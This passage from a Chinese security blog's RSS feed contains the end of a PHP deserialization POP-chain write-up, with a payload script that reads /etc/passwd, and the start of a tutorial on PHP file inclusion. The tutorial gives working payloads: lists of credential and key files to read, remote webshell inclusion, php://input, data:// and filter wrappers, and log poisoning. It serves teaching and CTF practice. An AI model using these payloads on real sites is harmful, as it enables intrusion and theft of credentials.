    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/gopher|http|ftp|https|dict|\.\.|flag|file/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; 		 &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/gopher|http|file|ftp|https|dict|\.\./i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hacker&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;index.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$function&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$show&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pop3.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$show&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;分析并寻找POP链：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先找外部可控的反序列化入口：&lt;code&gt;unserialize($_GET[&#39;hello&#39;]);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;分析各类的魔术方法&lt;/li&gt;
&lt;li&gt;Show类中存在&lt;code&gt;__wakeup()&lt;/code&gt;方法，其中对&lt;code&gt;source&lt;/code&gt;属性调用&lt;code&gt;preg_match()&lt;/code&gt;方法，如果source是某个类对象，会触发&lt;code&gt;__toString()&lt;/code&gt;方法&lt;/li&gt;
&lt;li&gt;Show类&lt;code&gt;__toString()&lt;/code&gt;方法从&lt;code&gt;str&lt;/code&gt;属性中取&lt;code&gt;str&lt;/code&gt;键，如果果&lt;code&gt;str[&#39;str&#39;]&lt;/code&gt;是某一个类对象，会触发&lt;code&gt;__get()&lt;/code&gt;方法&lt;/li&gt;
&lt;li&gt;Test类中存在&lt;code&gt;__get()&lt;/code&gt;方法，其中尝试对&lt;code&gt;p&lt;/code&gt;属性进行函数调用，如果p属性是某个类对象，会触发&lt;code&gt;__invode()&lt;/code&gt;方法&lt;/li&gt;
&lt;li&gt;Read类中存在&lt;code&gt;__invoke()&lt;/code&gt;方法，其中调用方法去读取&lt;code&gt;var&lt;/code&gt;属性值的文件内容。因此，为了获取&lt;code&gt;flag.php&lt;/code&gt;，可让var=flag.php&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;基于以上分析，编写脚本生成payload：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Show&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$R&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$S&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$T&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$R&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$S&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;str&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$T&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$S&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$S&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$S&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 502; 
			flex-basis: 1205px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-1/image-20220221102631381.png&#34; data-size=&#34;1376x274&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-1/image-20220221102631381.png&#34;
			width=&#34;1376&#34;
			height=&#34;274&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-1/image-20220221102631381_hu22d0bd641cac3ee0854b55580a4e34be_101998_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-1/image-20220221102631381_hu22d0bd641cac3ee0854b55580a4e34be_101998_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PHP 文件包含漏洞相关</title>
        <link>https://coollllllll.github.io/p/php-6/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/php-6/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post PHP 文件包含漏洞相关" /&gt;&lt;h1 id=&#34;php文件包含漏洞相关&#34;&gt;PHP文件包含漏洞相关&lt;/h1&gt;
&lt;h2 id=&#34;类别&#34;&gt;类别&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;本地文件包含&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如若关闭&lt;code&gt;allow_url_fopen&lt;/code&gt;，一般只能包含本地文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;远程文件包含&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要开启&lt;code&gt;allow_url_fopen &lt;/code&gt;和&lt;code&gt; allow_url_include&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;php.ini中，allow_url_fopen默认开启，而allow_url_include从php5.2之后默认关闭&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;包含的相关函数&#34;&gt;包含的相关函数&lt;/h2&gt;
&lt;p&gt;引发文件包含漏洞的相关函数如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;include()&lt;/li&gt;
&lt;li&gt;include_once()&lt;/li&gt;
&lt;li&gt;require()&lt;/li&gt;
&lt;li&gt;require_once()&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;require()在包含过程中出错(比如文件不存在)，会直接退出，不执行后续语句&lt;/p&gt;
&lt;p&gt;include()出错，会执行后续语句&lt;/p&gt;
&lt;p&gt;require_once()和include_once()，如果某文件已经被包含，则不会再包含该文件，避免重定义或变量赋值等问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上四个函数，不论文件类型如何(比如图片、.txt)，都会&lt;strong&gt;直接被当作php文件进行解析&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/.%5cimage-20210825110338853.png&#34; &gt;
		&lt;img src=&#34;https://coollllllll.github.io/.%5cimage-20210825110338853.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;本地敏感文件包含&#34;&gt;本地敏感文件包含&lt;/h3&gt;
&lt;p&gt;常见敏感文件列表：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Windows：
    C:\boot.ini //查看系统版本
    C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
    C:\Windows\repair\sam //存储系统初次安装的密码
    C:\Program Files\mysql\my.ini //Mysql配置
    C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
    C:\Windows\php.ini //php配置信息
    C:\Windows\my.ini //Mysql配置信息
    ...
Linux：
    /root/.ssh/authorized_keys
    /root/.ssh/id_rsa
    /root/.ssh/id_ras.keystore
    /root/.ssh/known_hosts
    /etc/passwd
    /etc/shadow
    /etc/my.cnf
    /etc/httpd/conf/httpd.conf
    /root/.bash_history
    /root/.mysql_history
    /proc/self/fd/fd[0-9]*(文件标识符)
    /proc/mounts
    /porc/config.gz
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;远程文件包含&#34;&gt;远程文件包含&lt;/h3&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[http|https|ftp]://www.test.com/shell.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若后缀名写死，可以用 ? 绕过:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//www.test.com/shell.txt?a
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP，所以在写一句话木马的时候就不要做成.php的文件，一般包含.txt的文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;伪协议&#34;&gt;伪协议&lt;/h3&gt;
&lt;h4 id=&#34;file&#34;&gt;file://&lt;/h4&gt;
&lt;p&gt;一般用来读本地文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file://文件的绝对路径
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;php协议&#34;&gt;php://协议&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;php://input&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php://input协议主要用于访问各个输入/输出流。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;php://input可读取&lt;strong&gt;未经处理过的&lt;/strong&gt;POST数据&lt;/p&gt;
&lt;p&gt;当&lt;code&gt;enctype=&amp;quot;multipart/form-data&amp;quot;&lt;/code&gt;的时候，php://input是无效的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;遇到&lt;code&gt;file_get_contents&lt;/code&gt;，也可使用php://input获取POST内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;allow_url_fopen 无要求
allow_url_include = On
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://input

POST:
&amp;lt;?php phpinfo ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;php://filter&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，&lt;strong&gt;对本地磁盘文件进行读写&lt;/strong&gt;。对于一体式(all-in-one)的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见参数：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;string.toupper                                     //上面有写
string.tolower                                     //转换为小写
string.strip_tags                                  //去除html和php标记，比如&amp;lt;?php?&amp;gt;
convert.base64-encode                              //base64编码
convert.base64-decode                              //base64编码
convert.quoted-printable-encode                    //quoted-printable 转 8bit
convert.quoted-printable-decode                    //同上
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;默认&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=include.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解码后读取源码即可。&lt;/p&gt;
&lt;h4 id=&#34;data协议&#34;&gt;data://协议&lt;/h4&gt;
&lt;p&gt;利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php版本&amp;gt;=5.2

allow_url_fopen = On

allow_url_include = On
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=data://text/plain,&amp;lt;?php phpinfo()?&amp;gt;
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
?file=data:text/plain,&amp;lt;?php phpinfo()?&amp;gt;
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;phar协议&#34;&gt;phar://协议&lt;/h4&gt;
&lt;p&gt;当文件上传被过滤，可结合文件包含利用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php版本&amp;gt;=5.3.0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload-将一句话-shell.php压缩为shell.zip，修改后缀为上传点允许值，例如.png，上传至网站：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//指定绝对路径
?file = phar:///var/www/html/test.png/phpinfo.txt

//指定相对路径
?file = phar://./test.png/phpinfo.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;zip-bzip2-zlib协议&#34;&gt;zip://, bzip2://, zlib://协议&lt;/h4&gt;
&lt;p&gt;这三个协议均属于压缩流，可访问压缩包中的子文件。后缀名无所谓，只要是zip文件头即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php版本&amp;gt;5.3.0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;zip:///var/www/html/phpinfo1.php#phpinfo.php
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注意&lt;code&gt;#&lt;/code&gt;要url编码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;伪协议总结&#34;&gt;伪协议总结&lt;/h4&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 654px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-6/image-20220220144743550.png&#34; data-size=&#34;886x325&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-6/image-20220220144743550.png&#34;
			width=&#34;886&#34;
			height=&#34;325&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-6/image-20220220144743550_hub3021d7fa2ca03a40b1ae3be0a2d0878_32227_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-6/image-20220220144743550_hub3021d7fa2ca03a40b1ae3be0a2d0878_32227_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;日志文件&#34;&gt;日志文件&lt;/h3&gt;
&lt;p&gt;Web请求一般会被记录再日志文件中，例如apache的&lt;code&gt;access log&lt;/code&gt;和&lt;code&gt;error log&lt;/code&gt;，该两个文件路径默认在&lt;code&gt;/var/log/apache2/&lt;/code&gt;下。&lt;/p&gt;
&lt;p&gt;因此可以构造带有一句话木马内容的请求，会被记录日志中，再包含日志即可。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;一般WWW用户是无权限读取该日志的，应用场景有限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;session文件&#34;&gt;Session文件&lt;/h3&gt;
&lt;h4 id=&#34;php中-upload_process-和-session相关配置介绍&#34;&gt;PHP中 upload_process 和 session相关配置介绍&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;session.upload_progress.enabled = on
session.upload_progress.cleanup = on
session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;
session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;

session.use_strict_mode
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;enabled=on&lt;/code&gt;表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cleanup=on&lt;/code&gt;表示上传结束后，PHP会立即清空对应的session文件中的内容&lt;/li&gt;
&lt;li&gt;PHP文档中对&lt;code&gt;prefix&lt;/code&gt;和&lt;code&gt;name&lt;/code&gt;两个选项详细说明：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 360; 
			flex-basis: 864px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-6/image-20220220150657188.png&#34; data-size=&#34;1099x305&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-6/image-20220220150657188.png&#34;
			width=&#34;1099&#34;
			height=&#34;305&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-6/image-20220220150657188_huea530170c08e2e87bae52a9cc998cae8_146015_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-6/image-20220220150657188_huea530170c08e2e87bae52a9cc998cae8_146015_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
